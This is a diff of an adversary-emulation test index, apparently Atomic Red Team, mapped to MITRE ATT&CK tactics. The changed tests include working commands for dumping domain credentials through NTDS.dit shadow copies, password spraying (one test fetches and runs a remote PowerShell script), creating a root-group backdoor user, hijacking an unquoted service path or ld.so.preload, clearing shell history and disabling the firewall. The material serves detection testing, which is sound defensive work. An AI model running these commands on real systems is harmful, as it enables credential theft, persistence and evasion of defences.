@@ -341,6 +341,13 @@ privilege-escalation:
           -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n
           \ }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value
           $Value\n  }\n}\n"
+        cleanup_command: |
+          $input_table = "#{parent_list}".split(",")
+          Foreach ($item in $input_table)
+          {
+            $item = $item.trim()
+            reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item" /v Debugger /f 2>&1 | Out-Null
+          }
         name: powershell
         elevation_required: true
   T1546.009:
@@ -1944,6 +1951,7 @@ privilege-escalation:
           type: string
           default: persistevil
       executor:
+        elevation_required: true
         name: bash
         command: echo "#{command}" > /etc/cron.daily/#{cron_script_name}
   T1574.001:
@@ -3199,11 +3207,11 @@ privilege-escalation:
         module_name:
           description: Name of the kernel module name.
           type: string
-          default: T1547.006
+          default: T1547006
         module_path:
           description: Folder used to store the module.
           type: path
-          default: PathToAtomicsFolder/T1547.006/bin/T1547.006.ko
+          default: "/tmp/T1547.006/T1547006.ko"
         temp_folder:
           description: Temp folder used to compile the code.
           type: path
@@ -3220,15 +3228,14 @@ privilege-escalation:
           if [ ! -d #{temp_folder} ]; then mkdir #{temp_folder}; touch #{temp_folder}/safe_to_delete; fi;
           cp #{module_source_path}/* #{temp_folder}/
           cd #{temp_folder}; make
-          mv #{temp_folder}/#{module_name}.ko #{module_path}
-          [ -f #{temp_folder}/safe_to_delete ] && rm -rf #{temp_folder}
+          if [ ! -f #{module_path} ]; then mv #{temp_folder}/#{module_name}.ko #{module_path}; fi;
       executor:
         command: 'sudo insmod #{module_path}
 
 '
-        cleanup_command: 'sudo rmmod #{module_name}
-
-'
+        cleanup_command: |
+          sudo rmmod #{module_name}
+          [ -f #{temp_folder}/safe_to_delete ] && rm -rf #{temp_folder}
         name: bash
         elevation_required: true
   T1546.006:
@@ -3351,7 +3358,7 @@ privilege-escalation:
         path_to_shared_library:
           description: Path to a shared library object
           type: Path
-          default: PathToAtomicsFolder/T1574.006/bin/T1574.006.so
+          default: "/tmp/T1574006.so"
       dependency_executor_name: bash
       dependencies:
       - description: The shared library must exist on disk at specified location (#{path_to_shared_library})
@@ -3362,7 +3369,7 @@ privilege-escalation:
         command: 'sudo sh -c ''echo #{path_to_shared_library} > /etc/ld.so.preload''
 
 '
-        cleanup_command: 'sudo sed -i ''/#{path_to_shared_library}/d'' /etc/ld.so.preload
+        cleanup_command: 'sudo sed -i ''\~#{path_to_shared_library}~d'' /etc/ld.so.preload
 
 '
         name: bash
@@ -3383,7 +3390,7 @@ privilege-escalation:
         path_to_shared_library:
           description: Path to a shared library object
           type: Path
-          default: PathToAtomicsFolder/T1574.006/bin/T1574.006.so
+          default: "/tmp/T1574006.so"
       dependency_executor_name: bash
       dependencies:
       - description: The shared library must exist on disk at specified location (#{path_to_shared_library})
@@ -4525,7 +4532,36 @@ privilege-escalation:
       - Stefan Kanthak
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1574.009
+    atomic_tests:
+    - name: Execution of program.exe as service with unquoted service path
+      auto_generated_guid: 2770dea7-c50f-457b-84c4-c40a47460d9f
+      description: |
+        When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability
+        known as Unquoted Service Path which allows a user to gain SYSTEM privileges.
+        In this case, if an executable program.exe in C:\ exists, C:\program.exe will be executed instead of test.exe in C:\Program Files\subfolder\test.exe.
+      supported_platforms:
+      - windows
+      input_arguments:
+        service_executable:
+          description: Path of the executable used for the service and as the hijacked
+            program.exe
+          type: path
+          default: PathToAtomicsFolder\T1574.009\bin\WindowsServiceExample.exe
+      executor:
+        command: |
+          copy #{service_executable} "C:\Program Files\windows_service.exe"
+          copy #{service_executable} "C:\program.exe"
+          sc create "Example Service" binpath= "C:\Program Files\windows_service.exe" Displayname= "Example Service" start= auto
+          sc start "Example Service"
+        cleanup_command: |
+          sc stop "Example Service"
+          sc delete "Example Service"
+          del "C:\Program Files\windows_service.exe"
+          del "C:\program.exe"
+          del "C:\Time.log"
+        name: command_prompt
+        elevation_required: true
   T1547.011:
     technique:
       id: attack-pattern--6747daa2-3533-4e78-8fb8-446ebb86448a
@@ -5255,13 +5291,14 @@ privilege-escalation:
         Windows 10 Utility To Inject DLLS.
 
         Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
+        With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.
       supported_platforms:
       - windows
       input_arguments:
         process_id:
           description: PID of input_arguments
           type: Integer
-          default: "(get-process spoolsv).id"
+          default: "(Start-Process notepad -PassThru).id"
         dll_payload:
           description: DLL to Inject
           type: Path
@@ -5937,21 +5974,21 @@ privilege-escalation:
           type: String
           default: localhost
         user_name:
-          description: Username DOMAIN\User
+          description: 'Username to authenticate with, format: DOMAIN\User'
           type: String
           default: DOMAIN\user
         password:
-          description: Password
+          description: Password to authenticate with
           type: String
           default: At0micStrong
       executor:
         name: command_prompt
         elevation_required: true
-        command: 'SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN
+        command: 'SCHTASKS /Create /S #{target} /U #{user_name} /P #{password} /TN
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
 '
-        cleanup_command: 'SCHTASKS /Delete /S #{target} /RU #{user_name} /RP #{password}
+        cleanup_command: 'SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password}
           /TN "Atomic task" /F >nul 2>&1
 
 '
@@ -6261,19 +6298,19 @@ privilege-escalation:
         powershell -c "Get-WmiObject win32_service | select PathName"   (check service file location) and
         copy /Y C:\temp\payload.exe C:\ProgramData\folder\Update\weakpermissionfile.exe   ( replace weak permission file with malicious file )
 
-        Upon execution, open the weak permission file at %temp%\ T1574.010_weak_permission_file.txt and verify that it's contents read " T1574.010 Malicious file". To verify
-        the weak file permissions, open File Explorer to%temp%\ T1574.010_weak_permission_file.exe then open Properties and Security to view the Full Control permission is enabled.
+        Upon execution, open the weak permission file at %temp%\T1574.010_weak_permission_file.txt and verify that it's contents read "T1574.010 Malicious file". To verify
+        the weak file permissions, open File Explorer to%temp%\T1574.010_weak_permission_file.exe then open Properties and Security to view the Full Control permission is enabled.
       supported_platforms:
       - windows
       input_arguments:
         malicious_file:
           description: File to replace weak permission file with
           type: path
-          default: "$env:TEMP\\ T1574.010\\ T1574.010_malicious_file.txt"
+          default: "$env:TEMP\\T1574.010\\T1574.010_malicious_file.txt"
         weak_permission_file:
           description: check weak files permission
           type: path
-          default: "$env:TEMP\\ T1574.010_weak_permission_file.txt"
+          default: "$env:TEMP\\T1574.010_weak_permission_file.txt"
       dependency_executor_name: powershell
       dependencies:
       - description: A file must exist on disk at specified location (#{weak_permission_file})
@@ -6286,7 +6323,7 @@ privilege-escalation:
           this would be the malicious file gaining extra privileges
         prereq_command: 'if (Test-Path #{malicious_file}) {exit 0} else {exit 1}'
         get_prereq_command: |-
-          New-Item -Type Directory -Path $env:TEMP\ T1574.010\ -Force | Out-Null
+          New-Item -Type Directory -Path $env:TEMP\T1574.010\ -Force | Out-Null
           New-Item #{malicious_file} -Force | Out-Null
           Set-Content -Path #{malicious_file} -Value " T1574.010 Malicious file"
       executor:
@@ -8031,6 +8068,13 @@ persistence:
           -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n
           \ }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value
           $Value\n  }\n}\n"
+        cleanup_command: |
+          $input_table = "#{parent_list}".split(",")
+          Foreach ($item in $input_table)
+          {
+            $item = $item.trim()
+            reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item" /v Debugger /f 2>&1 | Out-Null
+          }
         name: powershell
         elevation_required: true
   T1098:
@@ -9004,22 +9048,19 @@ persistence:
         local_file:
           description: Local file path to save downloaded file
           type: path
-          default: "%temp%\\bitsadmin_flag.ps1"
+          default: "%temp%\\bitsadmin3_flag.ps1"
         remote_file:
           description: Remote file to download
           type: url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
-        command_line:
-          description: Command line to execute
-          type: string
-          default: "%temp%\\bitsadmin3_flag.ps1"
       executor:
         command: |
           bitsadmin.exe /create #{bits_job_name}
           bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
-          bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} #{command_line}
-          bitsadmin.exe /complete AtomicBITS
+          bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} ""
           bitsadmin.exe /resume #{bits_job_name}
+          timeout 5
+          bitsadmin.exe /complete #{bits_job_name}
         cleanup_command: 'del #{local_file} >nul 2>&1
 
 '
@@ -10075,6 +10116,7 @@ persistence:
           type: string
           default: persistevil
       executor:
+        elevation_required: true
         name: bash
         command: echo "#{command}" > /etc/cron.daily/#{cron_script_name}
   T1574.001:
@@ -11194,11 +11236,11 @@ persistence:
         module_name:
           description: Name of the kernel module name.
           type: string
-          default: T1547.006
+          default: T1547006
         module_path:
           description: Folder used to store the module.
           type: path
-          default: PathToAtomicsFolder/T1547.006/bin/T1547.006.ko
+          default: "/tmp/T1547.006/T1547006.ko"
         temp_folder:
           description: Temp folder used to compile the code.
           type: path
@@ -11215,15 +11257,14 @@ persistence:
           if [ ! -d #{temp_folder} ]; then mkdir #{temp_folder}; touch #{temp_folder}/safe_to_delete; fi;
           cp #{module_source_path}/* #{temp_folder}/
           cd #{temp_folder}; make
-          mv #{temp_folder}/#{module_name}.ko #{module_path}
-          [ -f #{temp_folder}/safe_to_delete ] && rm -rf #{temp_folder}
+          if [ ! -f #{module_path} ]; then mv #{temp_folder}/#{module_name}.ko #{module_path}; fi;
       executor:
         command: 'sudo insmod #{module_path}
 
 '
-        cleanup_command: 'sudo rmmod #{module_name}
-
-'
+        cleanup_command: |
+          sudo rmmod #{module_name}
+          [ -f #{temp_folder}/safe_to_delete ] && rm -rf #{temp_folder}
         name: bash
         elevation_required: true
   T1546.006:
@@ -11346,7 +11387,7 @@ persistence:
         path_to_shared_library:
           description: Path to a shared library object
           type: Path
-          default: PathToAtomicsFolder/T1574.006/bin/T1574.006.so
+          default: "/tmp/T1574006.so"
       dependency_executor_name: bash
       dependencies:
       - description: The shared library must exist on disk at specified location (#{path_to_shared_library})
@@ -11357,7 +11398,7 @@ persistence:
         command: 'sudo sh -c ''echo #{path_to_shared_library} > /etc/ld.so.preload''
 
 '
-        cleanup_command: 'sudo sed -i ''/#{path_to_shared_library}/d'' /etc/ld.so.preload
+        cleanup_command: 'sudo sed -i ''\~#{path_to_shared_library}~d'' /etc/ld.so.preload
 
 '
         name: bash
@@ -11378,7 +11419,7 @@ persistence:
         path_to_shared_library:
           description: Path to a shared library object
           type: Path
-          default: PathToAtomicsFolder/T1574.006/bin/T1574.006.so
+          default: "/tmp/T1574006.so"
       dependency_executor_name: bash
       dependencies:
       - description: The shared library must exist on disk at specified location (#{path_to_shared_library})
@@ -11912,9 +11953,10 @@ persistence:
           type: String
           default: BetterWithButter
       executor:
-        command: |
-          useradd -o -u 0 -g 0 -M -d /root -s /bin/bash #{username}
-          echo "#{password}" | passwd --stdin #{username}
+        command: "useradd -g 0 -M -d /root -s /bin/bash #{username}\nif [ $(cat /etc/os-release
+          | grep -i 'Name=\"ubuntu\"') ]; then echo \"#{username}:#{password}\" |
+          sudo chpasswd; else echo \"#{password}\" | passwd --stdin #{username}; fi;
+          \     \n"
         cleanup_command: 'userdel #{username}
 
 '
@@ -12892,7 +12934,36 @@ persistence:
       - Stefan Kanthak
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1574.009
+    atomic_tests:
+    - name: Execution of program.exe as service with unquoted service path
+      auto_generated_guid: 2770dea7-c50f-457b-84c4-c40a47460d9f
+      description: |
+        When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability
+        known as Unquoted Service Path which allows a user to gain SYSTEM privileges.
+        In this case, if an executable program.exe in C:\ exists, C:\program.exe will be executed instead of test.exe in C:\Program Files\subfolder\test.exe.
+      supported_platforms:
+      - windows
+      input_arguments:
+        service_executable:
+          description: Path of the executable used for the service and as the hijacked
+            program.exe
+          type: path
+          default: PathToAtomicsFolder\T1574.009\bin\WindowsServiceExample.exe
+      executor:
+        command: |
+          copy #{service_executable} "C:\Program Files\windows_service.exe"
+          copy #{service_executable} "C:\program.exe"
+          sc create "Example Service" binpath= "C:\Program Files\windows_service.exe" Displayname= "Example Service" start= auto
+          sc start "Example Service"
+        cleanup_command: |
+          sc stop "Example Service"
+          sc delete "Example Service"
+          del "C:\Program Files\windows_service.exe"
+          del "C:\program.exe"
+          del "C:\Time.log"
+        name: command_prompt
+        elevation_required: true
   T1547.011:
     technique:
       id: attack-pattern--6747daa2-3533-4e78-8fb8-446ebb86448a
@@ -13939,21 +14010,21 @@ persistence:
           type: String
           default: localhost
         user_name:
-          description: Username DOMAIN\User
+          description: 'Username to authenticate with, format: DOMAIN\User'
           type: String
           default: DOMAIN\user
         password:
-          description: Password
+          description: Password to authenticate with
           type: String
           default: At0micStrong
       executor:
         name: command_prompt
         elevation_required: true
-        command: 'SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN
+        command: 'SCHTASKS /Create /S #{target} /U #{user_name} /P #{password} /TN
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
 '
-        cleanup_command: 'SCHTASKS /Delete /S #{target} /RU #{user_name} /RP #{password}
+        cleanup_command: 'SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password}
           /TN "Atomic task" /F >nul 2>&1
 
 '
@@ -14314,19 +14385,19 @@ persistence:
         powershell -c "Get-WmiObject win32_service | select PathName"   (check service file location) and
         copy /Y C:\temp\payload.exe C:\ProgramData\folder\Update\weakpermissionfile.exe   ( replace weak permission file with malicious file )
 
-        Upon execution, open the weak permission file at %temp%\ T1574.010_weak_permission_file.txt and verify that it's contents read " T1574.010 Malicious file". To verify
-        the weak file permissions, open File Explorer to%temp%\ T1574.010_weak_permission_file.exe then open Properties and Security to view the Full Control permission is enabled.
+        Upon execution, open the weak permission file at %temp%\T1574.010_weak_permission_file.txt and verify that it's contents read "T1574.010 Malicious file". To verify
+        the weak file permissions, open File Explorer to%temp%\T1574.010_weak_permission_file.exe then open Properties and Security to view the Full Control permission is enabled.
       supported_platforms:
       - windows
       input_arguments:
         malicious_file:
           description: File to replace weak permission file with
           type: path
-          default: "$env:TEMP\\ T1574.010\\ T1574.010_malicious_file.txt"
+          default: "$env:TEMP\\T1574.010\\T1574.010_malicious_file.txt"
         weak_permission_file:
           description: check weak files permission
           type: path
-          default: "$env:TEMP\\ T1574.010_weak_permission_file.txt"
+          default: "$env:TEMP\\T1574.010_weak_permission_file.txt"
       dependency_executor_name: powershell
       dependencies:
       - description: A file must exist on disk at specified location (#{weak_permission_file})
@@ -14339,7 +14410,7 @@ persistence:
           this would be the malicious file gaining extra privileges
         prereq_command: 'if (Test-Path #{malicious_file}) {exit 0} else {exit 1}'
         get_prereq_command: |-
-          New-Item -Type Directory -Path $env:TEMP\ T1574.010\ -Force | Out-Null
+          New-Item -Type Directory -Path $env:TEMP\T1574.010\ -Force | Out-Null
           New-Item #{malicious_file} -Force | Out-Null
           Set-Content -Path #{malicious_file} -Value " T1574.010 Malicious file"
       executor:
@@ -18163,12 +18234,14 @@ credential-access:
         elevation_required: true
     - name: Copy NTDS.dit from Volume Shadow Copy
       auto_generated_guid: c6237146-9ea6-4711-85c9-c56d263a6b03
-      description: "This test is intended to be run on a domain Controller.\n\nThe
-        Active Directory database NTDS.dit may be dumped by copying it from a Volume
-        Shadow Copy.\n\nThis test requires steps taken in the test \"Create Volume
-        Shadow Copy with NTDS.dit\".\nA successful test also requires the export of
-        the SYSTEM Registry hive. \nThis test must be executed on a Windows Domain
-        Controller.\n"
+      description: |
+        This test is intended to be run on a domain Controller.
+
+        The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
+
+        This test requires steps taken in the test "Create Volume Shadow Copy with NTDS.dit".
+        A successful test also requires the export of the SYSTEM Registry hive.
+        This test must be executed on a Windows Domain Controller.
       supported_platforms:
       - windows
       input_arguments:
@@ -18220,7 +18293,7 @@ credential-access:
         output_folder:
           description: Path where resulting dump should be placed
           type: Path
-          default: C:\Windows\Temp
+          default: C:\Windows\Temp\ntds_T1003
       dependencies:
       - description: Target must be a Domain Controller
         prereq_command: reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
@@ -18228,9 +18301,77 @@ credential-access:
         get_prereq_command: echo Sorry, Promoting this machine to a Domain Controller
           must be done manually
       executor:
-        command: 'ntdsutil "ac i ntds" "ifm" "create full #{output_folder}" q q
+        command: |
+          mkdir #{output_folder}
+          ntdsutil "ac i ntds" "ifm" "create full #{output_folder}" q q
+        cleanup_command: 'rmdir /q /s #{output_folder}
 
 '
+        name: command_prompt
+        elevation_required: true
+    - name: Create Volume Shadow Copy with WMI
+      auto_generated_guid: 224f7de0-8f0a-4a94-b5d8-989b036c86da
+      description: |
+        This test is intended to be run on a domain Controller.
+
+        The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
+      supported_platforms:
+      - windows
+      input_arguments:
+        drive_letter:
+          description: Drive letter to source VSC (including colon)
+          type: String
+          default: 'C:'
+      dependencies:
+      - description: Target must be a Domain Controller
+        prereq_command: reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
+          ProductType | findstr LanmanNT
+        get_prereq_command: echo Sorry, Promoting this machine to a Domain Controller
+          must be done manually
+      executor:
+        command: 'wmic shadowcopy call create Volume=#{drive_letter}
+
+'
+        name: command_prompt
+        elevation_required: true
+    - name: Create Volume Shadow Copy with Powershell
+      auto_generated_guid: 542bb97e-da53-436b-8e43-e0a7d31a6c24
+      description: |
+        This test is intended to be run on a domain Controller.
+
+        The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
+      supported_platforms:
+      - windows
+      input_arguments:
+        drive_letter:
+          description: Drive letter to source VSC (including colon)
+          type: String
+          default: 'C:'
+      executor:
+        command: "(gwmi -list win32_shadowcopy).Create(#{drive_letter},'ClientAccessible')\n"
+        name: powershell
+        elevation_required: true
+    - name: Create Symlink to Volume Shadow Copy
+      auto_generated_guid: 21748c28-2793-4284-9e07-d6d028b66702
+      description: |
+        This test is intended to be run on a domain Controller.
+
+        The Active Directory database NTDS.dit may be dumped by creating a symlink to Volume Shadow Copy.
+      supported_platforms:
+      - windows
+      input_arguments:
+        drive_letter:
+          description: Drive letter to source VSC (including colon)
+          type: String
+          default: 'C:'
+        symlink_path:
+          description: symlink path
+          type: String
+          default: C:\Temp\vssstore
+      executor:
+        command: |
+          vssadmin.exe create shadow /for=#{drive_letter}
+          mklink /D #{symlink_path} \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
         name: command_prompt
         elevation_required: true
   T1040:
@@ -18301,6 +18442,13 @@ credential-access:
           description: Specify interface to perform PCAP on.
           type: String
           default: ens33
+      dependency_executor_name: bash
+      dependencies:
+      - description: Check if at least one of the tools are installed on the machine.
+        prereq_command: if [ ! -x "$(command -v tcpdump)" ] && [ ! -x "$(command -v
+          tshark)" ]; then exit 1; else exit 0; fi;
+        get_prereq_command: echo "Install tcpdump and/or tshark for the test to run.";
+          exit 1;
       executor:
         command: |
           tcpdump -c 5 -nnni #{interface}
@@ -18351,26 +18499,6 @@ credential-access:
           "c:\Program Files\Wireshark\tshark.exe" -i #{interface} -c 5
           c:\windump.exe
         name: command_prompt
-        elevation_required: true
-    - name: Packet Capture PowerShell
-      auto_generated_guid: 2bf62970-013a-4c74-b0a8-64030874e89a
-      description: |
-        Perform a packet capture using PowerShell with windump or tshark. This will require a host that has Wireshark/Tshark
-        installed, along with WinPCAP. Windump will require the windump executable.
-
-        Upon successful execution, tshark will spawn from powershell and capture 5 packets on interface Ethernet0.
-      supported_platforms:
-      - windows
-      input_arguments:
-        interface:
-          description: Specify interface to perform PCAP on.
-          type: String
-          default: Ethernet0
-      executor:
-        command: |
-          & "c:\Program Files\Wireshark\tshark.exe" -i #{interface} -c 5
-          & c:\windump.exe
-        name: powershell
         elevation_required: true
   T1003:
     technique:
@@ -18790,13 +18918,13 @@ credential-access:
           type: String
           default: YOUR_COMPANY
       executor:
+        name: command_prompt
         command: |
           net user /domain > #{input_file_users}
           echo "Password1" >> #{input_file_passwords}
           echo "1q2w3e4r" >> #{input_file_passwords}
           echo "Password!" >> #{input_file_passwords}
           @FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL
-        name: command_prompt
   T1110.003:
     technique:
       external_references:
@@ -18875,7 +19003,54 @@ credential-access:
       x_mitre_contributors:
       - Microsoft Threat Intelligence Center (MSTIC)
       - John Strand
-    atomic_tests: []
+      identifier: T1110.003
+    atomic_tests:
+    - name: Password Spray all Domain Users
+      auto_generated_guid: 90bc2e54-6c84-47a5-9439-0a2a92b4b175
+      description: |-
+        CAUTION! Be very careful to not exceed the password lockout threshold for users in the domain by running this test too frequently.
+        This atomic attempts to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the %temp%\users.txt list. Any successful authentications will be printed to the screen with a message like "[*] username:password", whereas a failed auth will simply print a period. Use the input arguments to specify your own password to use for the password spray.
+        Use the get_prereq_command's to create a list of all domain users in the temp directory called users.txt.
+        See the "Windows FOR Loop Password Spraying Made Easy" blog by @OrEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5
+      supported_platforms:
+      - windows
+      input_arguments:
+        password:
+          description: The password to try for each user in users.txt
+          type: string
+          default: Spring2020
+      dependencies:
+      - description: List of domain users to password spray must exits at %temp%\users.txt
+        prereq_command: if not exist %temp%\users.txt (exit /b 1)
+        get_prereq_command: PathToAtomicsFolder\T1110.003\src\parse_net_users.bat
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: '@FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$
+          /user:"%userdomain%\%n" "#{password}" 1>NUL 2>&1 && @echo [*] %n:#{password}
+          && @net use /delete %logonserver%\IPC$ > NUL
+
+'
+    - name: Password Spray (DomainPasswordSpray)
+      auto_generated_guid: 263ae743-515f-4786-ac7d-41ef3a0d4b2b
+      description: |
+        Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain
+
+        https://github.com/dafthack/DomainPasswordSpray
+      supported_platforms:
+      - windows
+      input_arguments:
+        domain:
+          description: Domain to brute force against
+          type: String
+          default: "(Get-ADDomain | Select-Object -ExpandProperty Name)"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: 'IEX (IWR ''https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1'');
+          Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force
+
+'
   T1552.004:
     technique:
       id: attack-pattern--60b508a1-6a5e-46b1-821a-9f7b78752abf
@@ -20168,22 +20343,19 @@ defense-evasion:
         local_file:
           description: Local file path to save downloaded file
           type: path
-          default: "%temp%\\bitsadmin_flag.ps1"
+          default: "%temp%\\bitsadmin3_flag.ps1"
         remote_file:
           description: Remote file to download
           type: url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
-        command_line:
-          description: Command line to execute
-          type: string
-          default: "%temp%\\bitsadmin3_flag.ps1"
       executor:
         command: |
           bitsadmin.exe /create #{bits_job_name}
           bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
-          bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} #{command_line}
-          bitsadmin.exe /complete AtomicBITS
+          bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} ""
           bitsadmin.exe /resume #{bits_job_name}
+          timeout 5
+          bitsadmin.exe /complete #{bits_job_name}
         cleanup_command: 'del #{local_file} >nul 2>&1
 
 '
@@ -20835,6 +21007,22 @@ defense-evasion:
         command: |
           unset HISTFILE
           export HISTFILESIZE=0
+          history -c
+        name: sh
+    - name: Clear and Disable Bash History Logging
+      auto_generated_guid: 784e4011-bd1a-4ecd-a63a-8feb278512e6
+      description: 'Clears the history and disable bash history logging of the current
+        shell and future shell sessions
+
+'
+      supported_platforms:
+      - linux
+      - macos
+      executor:
+        command: |
+          set +o history
+          echo 'set +o history' >> ~/.bashrc
+          . ~/.bashrc
           history -c
         name: sh
   T1551.002:
@@ -22094,6 +22282,51 @@ defense-evasion:
             systemctl disable firewalld
           fi
         name: sh
+    - name: Disable Microsoft Defender Firewall
+      auto_generated_guid: 88d05800-a5e4-407e-9b53-ece4174f197f
+      description: |
+        Disables the Microsoft Defender Firewall for the current profile.
+        Caution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...
+      supported_platforms:
+      - windows
+      executor:
+        command: 'netsh advfirewall set currentprofile state off
+
+'
+        cleanup_command: 'netsh advfirewall set currentprofile state on
+
+'
+        name: command_prompt
+    - name: Allow SMB and RDP on Microsoft Defender Firewall
+      auto_generated_guid: d9841bf8-f161-4c73-81e9-fd773a5ff8c1
+      description: |
+        Allow all SMB and RDP rules on the Microsoft Defender Firewall for all profiles.
+        Caution if you access remotely the host where the test runs! Especially with the cleanup command which will reset the firewall and risk disabling those services...
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+          netsh advfirewall firewall set rule group="file and printer sharing" new enable=Yes
+        cleanup_command: 'netsh advfirewall reset
+
+'
+        name: command_prompt
+    - name: Opening ports for proxy - HARDRAIN
+      auto_generated_guid: 15e57006-79dd-46df-9bf9-31bc24fb5a80
+      description: |
+        This test creates a listening interface on a victim device. This tactic was used by HARDRAIN for proxying.
+
+        reference: https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-F.pdf
+      supported_platforms:
+      - windows
+      executor:
+        command: "netsh advfirewall firewall add rule name=\"atomic testing\" action=allow
+          dir=in protocol=TCP localport=450 \n"
+        cleanup_command: netsh advfirewall firewall delete rule name="atomic testing"
+          protocol=TCP localport=450
+        name: command_prompt
+        elevation_required: true
   T1562.001:
     technique:
       external_references:
@@ -23771,7 +24004,7 @@ defense-evasion:
       executor:
         command: |
           export HISTCONTROL=ignoreboth
-          ls #{evil_command}
+          #{evil_command}
         name: sh
     - name: Mac HISTCONTROL
       auto_generated_guid: 468566d5-83e5-40c1-b338-511e1659628d
@@ -24430,10 +24663,10 @@ defense-evasion:
       x_mitre_is_subtechnique: false
       identifier: T1551
     atomic_tests:
-    - name: FSUtil
+    - name: Indicator Removal using FSUtil
       auto_generated_guid: b4115c7a-0e92-47f0-a61e-17e7218b2435
       description: |
-        Manages the update sequence number (USN) change journal, which provides a persistent log of all changes made to files on the volume. Upon exectuion, no output
+        Manages the update sequence number (USN) change journal, which provides a persistent log of all changes made to files on the volume. Upon execution, no output
         will be displayed. More information about fsutil can be found at https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn
       supported_platforms:
       - windows
@@ -25493,7 +25726,7 @@ defense-evasion:
         path_to_shared_library:
           description: Path to a shared library object
           type: Path
-          default: PathToAtomicsFolder/T1574.006/bin/T1574.006.so
+          default: "/tmp/T1574006.so"
       dependency_executor_name: bash
       dependencies:
       - description: The shared library must exist on disk at specified location (#{path_to_shared_library})
@@ -25504,7 +25737,7 @@ defense-evasion:
         command: 'sudo sh -c ''echo #{path_to_shared_library} > /etc/ld.so.preload''
 
 '
-        cleanup_command: 'sudo sed -i ''/#{path_to_shared_library}/d'' /etc/ld.so.preload
+        cleanup_command: 'sudo sed -i ''\~#{path_to_shared_library}~d'' /etc/ld.so.preload
 
 '
         name: bash
@@ -25525,7 +25758,7 @@ defense-evasion:
         path_to_shared_library:
           description: Path to a shared library object
           type: Path
-          default: PathToAtomicsFolder/T1574.006/bin/T1574.006.so
+          default: "/tmp/T1574006.so"
       dependency_executor_name: bash
       dependencies:
       - description: The shared library must exist on disk at specified location (#{path_to_shared_library})
@@ -27196,7 +27429,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{exe_payload}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           Invoke-WebRequest "#{url_path}" -OutFile "$env:temp\T1027.zip"
-          Expand-Archive -path "$env:temp\T1027.zip" -DestinationPath "$env:temp\temp_T1027.zip\"
+          Expand-Archive -path "$env:temp\T1027.zip" -DestinationPath "$env:temp\temp_T1027.zip\" -Force
       executor:
         command: '"#{exe_payload}"
 
@@ -27881,7 +28114,36 @@ defense-evasion:
       - Stefan Kanthak
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1574.009
+    atomic_tests:
+    - name: Execution of program.exe as service with unquoted service path
+      auto_generated_guid: 2770dea7-c50f-457b-84c4-c40a47460d9f
+      description: |
+        When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability
+        known as Unquoted Service Path which allows a user to gain SYSTEM privileges.
+        In this case, if an executable program.exe in C:\ exists, C:\program.exe will be executed instead of test.exe in C:\Program Files\subfolder\test.exe.
+      supported_platforms:
+      - windows
+      input_arguments:
+        service_executable:
+          description: Path of the executable used for the service and as the hijacked
+            program.exe
+          type: path
+          default: PathToAtomicsFolder\T1574.009\bin\WindowsServiceExample.exe
+      executor:
+        command: |
+          copy #{service_executable} "C:\Program Files\windows_service.exe"
